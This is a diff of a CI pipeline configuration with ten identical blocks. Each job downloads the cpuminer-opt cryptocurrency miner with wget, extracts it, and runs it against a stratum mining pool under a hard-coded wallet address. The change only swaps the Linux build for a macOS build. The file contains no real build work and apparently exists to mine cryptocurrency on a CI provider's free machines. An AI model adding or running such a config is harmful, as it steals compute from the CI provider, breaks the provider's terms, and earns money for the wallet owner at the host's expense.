@@ -12,8 +12,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
     dependencies: []
   - name: 'Block #2'
@@ -22,8 +23,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #3'
     dependencies: []
@@ -31,8 +33,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #4'
     dependencies: []
@@ -40,8 +43,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #5'
     dependencies: []
@@ -49,8 +53,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #6'
     dependencies: []
@@ -58,8 +63,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #7'
     dependencies: []
@@ -67,8 +73,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #8'
     dependencies: []
@@ -76,8 +83,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #9'
     dependencies: []
@@ -85,8 +93,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
   - name: 'Block #10'
     dependencies: []
@@ -94,6 +103,7 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-mac.tar.gz'
+            - brew install gnu-tar
+            - gtar xvf cpuminer-opt-mac.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qgel56acveq6xqjxrk87pmf3fjt7xw07s33n30q.docker1 '
